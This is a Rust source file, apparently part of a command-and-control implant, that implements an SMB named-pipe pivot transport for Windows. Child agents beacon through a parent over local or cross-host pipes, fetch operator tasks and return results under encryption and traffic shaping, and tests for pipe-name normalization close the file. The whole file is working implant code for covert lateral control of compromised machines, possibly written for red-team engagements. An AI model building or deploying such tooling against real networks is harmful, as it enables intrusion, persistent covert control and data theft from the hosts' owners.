//! SMB pivot transport on Windows.
//!
//! The pipe I/O uses `tokio::net::windows::named_pipe::NamedPipeClient`,
//! which wraps `CreateFileW` + `FILE_FLAG_OVERLAPPED` and handles
//! the IOCP completion loop internally. This is wire-identical to
//! the Go tree's hand-rolled overlapped I/O — same `CreateFileW`
//! flags, same 4-byte BE length prefix, same 30-second per-op
//! timeout — but async rather than blocking.
//!
//! # `FrameIO` and the parent
//!
//! The parent forwards both the child's request and the server's
//! response as opaque bytes. The child's `PipeIO` carries one
//! frame at a time: a 4-byte BE length followed by the body. The
//! pivot handshake, the frame encryption, and the frame decryption
//! are all the child's responsibility; the parent never sees inside
//! the pivot envelope.

use std::time::Duration;

use async_trait::async_trait;
use p256::ecdsa::{SigningKey, VerifyingKey};
use serde::Deserialize;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::windows::named_pipe::{ClientOptions, NamedPipeClient};
use tokio::sync::Mutex;

use crate::crypto::wire::{is_envelope, WireSession};
use crate::features::shaping::{shape_unwrap, shape_wrap, ShapingSpec};
use crate::pivot::{
    client_handshake, decode_frame, encode_frame, FrameIO, Session,
};
use crate::protocol::{
    CheckinRequest, CheckinResponse, Identity, Task, TaskResult, Transport,
    TransportError,
};

// =====================================================================
// Constants
// =====================================================================

/// Per-operation timeout for a read or write on the pipe. Matches
/// the Go tree's `pipeDeadline`.
const PIPE_DEADLINE: Duration = Duration::from_secs(30);

/// Frame body cap, matching the pivot protocol's documented
/// 16 MiB limit.
const MAX_FRAME_BODY: usize = 16 * 1024 * 1024;

// =====================================================================
// SmbTransport
// =====================================================================

/// The SMB pivot transport.
///
/// Holds the pipe name (already normalized), the child's identity
/// signing key, the engagement-wide pivot public key, the child's
/// fingerprint, and the shaping spec. The pipe handle and the
/// current pivot session are behind a `tokio::sync::Mutex`
/// because the `Transport` trait methods take `&self` but
/// `round_trip` needs `&mut` access to both.
pub struct SmbTransport {
    pipe_name: String,
    agent_priv: SigningKey,
    pivot_pub: VerifyingKey,
    fingerprint: String,
    shaping: Option<ShapingSpec>,
    inner: Mutex<Inner>,
}

struct Inner {
    io: Option<PipeIO>,
    session: Option<Session>,
}

/// One frame's worth of pipe I/O.
struct PipeIO {
    pipe: NamedPipeClient,
}

#[async_trait]
impl FrameIO for PipeIO {
    async fn write_frame(&mut self, body: &[u8]) -> std::io::Result<()> {
        let len = (body.len() as u32).to_be_bytes();
        let fut = async {
            self.pipe.write_all(&len).await?;
            self.pipe.write_all(body).await?;
            self.pipe.flush().await?;
            Ok::<(), std::io::Error>(())
        };
        match tokio::time::timeout(PIPE_DEADLINE, fut).await {
            Ok(inner) => inner,
            Err(_) => Err(std::io::Error::new(
                std::io::ErrorKind::TimedOut,
                format!("pipe write: timeout after {PIPE_DEADLINE:?}"),
            )),
        }
    }

    async fn read_frame(&mut self) -> std::io::Result<Vec<u8>> {
        let fut = async {
            let mut len_buf = [0u8; 4];
            self.pipe.read_exact(&mut len_buf).await?;
            let n = u32::from_be_bytes(len_buf);
            if n == 0 || (n as usize) > MAX_FRAME_BODY {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    format!("invalid frame length {n}"),
                ));
            }
            let mut buf = vec![0u8; n as usize];
            self.pipe.read_exact(&mut buf).await?;
            Ok::<Vec<u8>, std::io::Error>(buf)
        };
        match tokio::time::timeout(PIPE_DEADLINE, fut).await {
            Ok(inner) => inner,
            Err(_) => Err(std::io::Error::new(
                std::io::ErrorKind::TimedOut,
                format!("pipe read: timeout after {PIPE_DEADLINE:?}"),
            )),
        }
    }
}

impl SmbTransport {
    /// Construct an SMB pivot transport.
    ///
    /// `identity` is the child's `Identity`; the fingerprint is
    /// computed here (not passed in) so the constructor cannot be
    /// given an identity and a mismatched fingerprint.
    ///
    /// Returns an error if the pipe name is empty, the identity's
    /// fingerprint is empty, or the pipe name's normalization
    /// fails.
    pub fn new(
        pipe_name: &str,
        agent_priv: SigningKey,
        pivot_pub: VerifyingKey,
        identity: &Identity,
        shaping: Option<ShapingSpec>,
    ) -> Result<Self, TransportError> {
        if pipe_name.is_empty() {
            return Err(TransportError::Other(
                "smb transport: pipe name is empty".into(),
            ));
        }
        let normalized = normalize_child_pipe_name(pipe_name)?;
        let fingerprint = identity.fingerprint();
        if fingerprint.is_empty() {
            return Err(TransportError::Other(
                "smb transport: identity produced an empty fingerprint"
                    .into(),
            ));
        }
        Ok(Self {
            pipe_name: normalized,
            agent_priv,
            pivot_pub,
            fingerprint,
            shaping,
            inner: Mutex::new(Inner {
                io: None,
                session: None,
            }),
        })
    }

    // -----------------------------------------------------------------
    // Dial / close
    // -----------------------------------------------------------------

    fn dial(&self, inner: &mut Inner) -> Result<(), TransportError> {
        if inner.io.is_some() {
            return Ok(());
        }
        let pipe = ClientOptions::new().open(&self.pipe_name).map_err(|e| {
            TransportError::Other(format!(
                "CreateFile {}: {e}",
                self.pipe_name,
            ))
        })?;
        inner.io = Some(PipeIO { pipe });
        Ok(())
    }

    fn close_inner(inner: &mut Inner) {
        inner.io = None;
        if let Some(sess) = inner.session.take() {
            sess.close();
        }
    }

    // -----------------------------------------------------------------
    // Round trip
    // -----------------------------------------------------------------

    /// One dial → handshake → encrypt → write → read → decrypt
    /// cycle, with one retry on transport-level failure.
    ///
    /// `dial` failure is fatal (no retry): a `CreateFile` failure
    /// will not succeed on the same host on the second attempt.
    /// Handshake, encrypt, write, and read failures close the
    /// pipe and retry once. Encode, decode, and decrypt failures
    /// are fatal — they indicate a protocol or crypto mismatch
    /// that will repeat.
    async fn round_trip(&self, req: &[u8]) -> Result<Vec<u8>, TransportError> {
        let mut inner = self.inner.lock().await;
        let mut last_err: Option<TransportError> = None;

        for _attempt in 0..2 {
            // ---- Dial --------------------------------------
            if let Err(e) = self.dial(&mut inner) {
                Self::close_inner(&mut inner);
                return Err(e);
            }

            // ---- Handshake (if not yet established) --------
            if inner.session.is_none() {
                let result = {
                    let io = inner
                        .io
                        .as_mut()
                        .expect("io present after dial");
                    client_handshake(
                        io,
                        &self.agent_priv,
                        &self.pivot_pub,
                        &self.fingerprint,
                    )
                    .await
                };
                match result {
                    Ok(sess) => inner.session = Some(sess),
                    Err(e) => {
                        Self::close_inner(&mut inner);
                        last_err = Some(TransportError::Other(format!(
                            "smb: handshake: {e}"
                        )));
                        continue;
                    }
                }
            }

            // ---- Encrypt -----------------------------------
            let frame = {
                let sess = inner
                    .session
                    .as_ref()
                    .expect("session present after handshake");
                match sess.encrypt_child_to_parent(req) {
                    Ok(f) => f,
                    Err(e) => {
                        Self::close_inner(&mut inner);
                        last_err = Some(TransportError::Other(format!(
                            "smb: encrypt: {e}"
                        )));
                        continue;
                    }
                }
            };

            // ---- Encode (fatal) ----------------------------
            let frame_bytes = match encode_frame(&frame) {
                Ok(b) => b,
                Err(e) => {
                    Self::close_inner(&mut inner);
                    return Err(TransportError::Other(format!(
                        "smb: encode frame: {e}"
                    )));
                }
            };

            // ---- Write + Read ------------------------------
            let resp_bytes = {
                let io =
                    inner.io.as_mut().expect("io present after dial");
                if let Err(e) = io.write_frame(&frame_bytes).await {
                    Self::close_inner(&mut inner);
                    last_err = Some(TransportError::Other(format!(
                        "smb: write frame: {e}"
                    )));
                    continue;
                }
                match io.read_frame().await {
                    Ok(b) => b,
                    Err(e) => {
                        Self::close_inner(&mut inner);
                        last_err = Some(TransportError::Other(format!(
                            "smb: read frame: {e}"
                        )));
                        continue;
                    }
                }
            };

            // ---- Decode (fatal) ----------------------------
            let resp_frame = match decode_frame(&resp_bytes) {
                Ok(f) => f,
                Err(e) => {
                    Self::close_inner(&mut inner);
                    return Err(TransportError::Other(format!(
                        "smb: decode frame: {e}"
                    )));
                }
            };

            // ---- Decrypt (fatal) ---------------------------
            let plaintext = {
                let sess = inner
                    .session
                    .as_ref()
                    .expect("session present after handshake");
                match sess.decrypt_parent_to_child(&resp_frame) {
                    Ok(p) => p,
                    Err(e) => {
                        Self::close_inner(&mut inner);
                        return Err(TransportError::Other(format!(
                            "smb: decrypt: {e}"
                        )));
                    }
                }
            };

            return Ok(plaintext);
        }

        Err(last_err.unwrap_or_else(|| {
            TransportError::Other(
                "smb: pipe failed after reconnect".into(),
            )
        }))
    }
}

// =====================================================================
// Transport trait
// =====================================================================

#[async_trait]
impl Transport for SmbTransport {
    fn name(&self) -> &'static str {
        "smb"
    }

    async fn check_in(
        &self,
        identity: &Identity,
        agent_pubkey_pem: &str,
        identity_sig: &str,
        identity_ts: i64,
        wire: &WireSession,
    ) -> Result<CheckinResponse, TransportError> {
        // ---- Build CheckinRequest ------------------------------
        let payload = CheckinRequest {
            identity: identity.clone(),
            agent_pubkey: (!agent_pubkey_pem.is_empty())
                .then(|| agent_pubkey_pem.to_string()),
            identity_sig: (!identity_sig.is_empty())
                .then(|| identity_sig.to_string()),
            identity_ts: (!identity_sig.is_empty())
                .then_some(identity_ts),
        };
        let body = serde_json::to_vec(&payload)?;

        // ---- Wire encrypt (always: this request carries epk) ---
        let body = wire.encrypt_request(&body)?.into_owned();

        // ---- Wrap in the pivot envelope ------------------------
        let body_json: serde_json::Value =
            serde_json::from_slice(&body)?;
        let req_bytes = serde_json::to_vec(&serde_json::json!({
            "op": "beacon",
            "body": body_json,
        }))?;

        // ---- Round trip ----------------------------------------
        let resp_bytes = self.round_trip(&req_bytes).await?;
        let resp = parse_pivot_reply(&resp_bytes)?;
        let resp_body = match resp.body {
            Some(v) => serde_json::to_vec(&v)?,
            None => Vec::new(),
        };

        // ---- Wire decrypt (unconditional — CheckIn carried epk) -
        let resp_body =
            wire.decrypt_response(&resp_body)?.0.into_owned();

        // ---- Shape unwrap --------------------------------------
        let resp_body = if let Some(spec) = self
            .shaping
            .as_ref()
            .and_then(|s| s.checkin_response.as_ref())
        {
            shape_unwrap(&resp_body, spec).map_err(|e| {
                TransportError::Other(format!(
                    "smb: checkin shape: {e}"
                ))
            })?
        } else {
            resp_body
        };

        // ---- Parse CheckinResponse -----------------------------
        let out: CheckinResponse = serde_json::from_slice(&resp_body)?;
        Ok(out)
    }

    async fn fetch_tasks(
        &self,
        wire: &WireSession,
    ) -> Result<Vec<Task>, TransportError> {
        let req_bytes = serde_json::to_vec(&serde_json::json!({
            "op": "tasks",
        }))?;

        let resp_bytes = self.round_trip(&req_bytes).await?;
        let resp = parse_pivot_reply(&resp_bytes)?;
        let mut body = match resp.body {
            Some(v) => serde_json::to_vec(&v)?,
            None => Vec::new(),
        };

        // ---- Wire decrypt (only if envelope present) ----------
        //
        // A pivoted tasks request carries no epk, so the server
        // may respond in plaintext. The pivot tunnel's own AEAD
        // is the integrity layer for that hop. `is_envelope`
        // distinguishes "the server chose to encrypt" from "the
        // server sent plaintext by design" so a legitimate
        // plaintext reply is not treated as a decryption failure.
        if wire.is_enabled() && is_envelope(&body) {
            body = wire.decrypt_response(&body)?.0.into_owned();
        }

        // ---- Shape unwrap --------------------------------------
        if let Some(spec) = self
            .shaping
            .as_ref()
            .and_then(|s| s.tasks_response.as_ref())
        {
            body = shape_unwrap(&body, spec).map_err(|e| {
                TransportError::Other(format!(
                    "smb: tasks shape: {e}"
                ))
            })?;
        }

        let tasks: Vec<Task> = serde_json::from_slice(&body)?;
        Ok(tasks)
    }

    async fn post_result(
        &self,
        r: TaskResult,
        wire: &WireSession,
    ) -> Result<(), TransportError> {
        // ---- Shape or plain ------------------------------------
        let body = if let Some(spec) = self
            .shaping
            .as_ref()
            .and_then(|s| s.results_request.as_ref())
        {
            shape_wrap(spec, &r)?
        } else {
            serde_json::to_vec(&r)?
        };

        // ---- Wire encrypt --------------------------------------
        let body = wire.encrypt_request(&body)?.into_owned();

        // ---- Wrap in the pivot envelope ------------------------
        let body_json: serde_json::Value =
            serde_json::from_slice(&body)?;
        let req_bytes = serde_json::to_vec(&serde_json::json!({
            "op": "results",
            "body": body_json,
        }))?;

        // ---- Round trip ----------------------------------------
        let resp_bytes = self.round_trip(&req_bytes).await?;
        let _ = parse_pivot_reply(&resp_bytes)?;
        Ok(())
    }

    async fn close(&self) -> Result<(), TransportError> {
        let mut inner = self.inner.lock().await;
        Self::close_inner(&mut inner);
        Ok(())
    }
}

// =====================================================================
// Pipe-name normalization
// =====================================================================

/// Normalize a child pipe name to the exact string `CreateFileW`
/// should receive.
///
/// - `\\.\pipe\NAME` → unchanged (local)
/// - `\\HOST\pipe\NAME` → unchanged (UNC, cross-host over SMB)
/// - `NAME` → `\\.\pipe\NAME` (local, bare)
///
/// A `\\...` name that does not contain `\pipe\` is rejected at
/// construction rather than letting `CreateFileW` fail with
/// `ERROR_BAD_PATHNAME`, which is indistinguishable from a
/// typo'd hostname in the operator's log.
fn normalize_child_pipe_name(
    name: &str,
) -> Result<String, TransportError> {
    if name.is_empty() {
        return Err(TransportError::Other(
            "smb transport: pipe name is empty".into(),
        ));
    }
    if name.starts_with(r"\\.\pipe\") {
        return Ok(name.to_string());
    }
    if name.starts_with(r"\\") {
        if !name.contains(r"\pipe\") {
            return Err(TransportError::Other(format!(
                "smb transport: {name:?} looks like a UNC path \
                 but is missing the \\pipe\\ segment; \
                 expected \\\\HOST\\pipe\\NAME"
            )));
        }
        return Ok(name.to_string());
    }
    Ok(format!(r"\\.\pipe\{name}"))
}

// =====================================================================
// Reply parser
// =====================================================================

/// Parsed pivot envelope reply: `{body, error, status}`.
struct PivotReply {
    body: Option<serde_json::Value>,
}

fn parse_pivot_reply(bytes: &[u8]) -> Result<PivotReply, TransportError> {
    #[derive(Deserialize, Default)]
    struct Raw {
        #[serde(default)]
        body: Option<serde_json::Value>,
        #[serde(default)]
        error: String,
        #[serde(default)]
        status: i32,
    }
    let raw: Raw = serde_json::from_slice(bytes).map_err(|e| {
        TransportError::Other(format!("smb: bad reply: {e}"))
    })?;
    if raw.status != 0 {
        return Err(TransportError::Other(format!(
            "smb: status {}: {}",
            raw.status, raw.error,
        )));
    }
    if !raw.error.is_empty() {
        return Err(TransportError::Other(format!(
            "smb: {}",
            raw.error,
        )));
    }
    Ok(PivotReply { body: raw.body })
}

// =====================================================================
// Tests
// =====================================================================

#[cfg(test)]
mod tests {
    use super::normalize_child_pipe_name;

    #[test]
    fn bare_name_becomes_local_pipe() {
        assert_eq!(
            normalize_child_pipe_name("tornado_relay_001").unwrap(),
            r"\\.\pipe\tornado_relay_001",
        );
    }

    #[test]
    fn local_path_passes_through() {
        let name = r"\\.\pipe\tornado_relay_001";
        assert_eq!(normalize_child_pipe_name(name).unwrap(), name);
    }

    #[test]
    fn unc_path_passes_through() {
        let name = r"\\WIN-SRV2\pipe\tornado_relay_001";
        assert_eq!(normalize_child_pipe_name(name).unwrap(), name);
    }

    #[test]
    fn empty_name_rejected() {
        assert!(normalize_child_pipe_name("").is_err());
    }

    #[test]
    fn unc_without_pipe_segment_rejected() {
        // A UNC path with no `\pipe\` segment would fail at
        // CreateFileW with ERROR_BAD_PATHNAME and be
        // indistinguishable from a typo'd hostname. Reject at
        // construction.
        let err = normalize_child_pipe_name(r"\\WIN-SRV2\share\foo");
        assert!(err.is_err());
        let msg = format!("{}", err.unwrap_err());
        assert!(msg.contains("missing the \\pipe\\ segment"));
    }

    #[test]
    fn double_backslash_single_letter_pipe() {
        // Sanity: a `\\` prefix (two literal backslashes) is
        // recognized as a UNC prefix. A single leading backslash
        // is not.
        assert!(normalize_child_pipe_name(r"\\").is_err());
        // Leading single backslash — treated as bare, gets the
        // local prefix.
        let out = normalize_child_pipe_name(r"\single").unwrap();
        assert_eq!(out, r"\\.\pipe\\single");
    }
}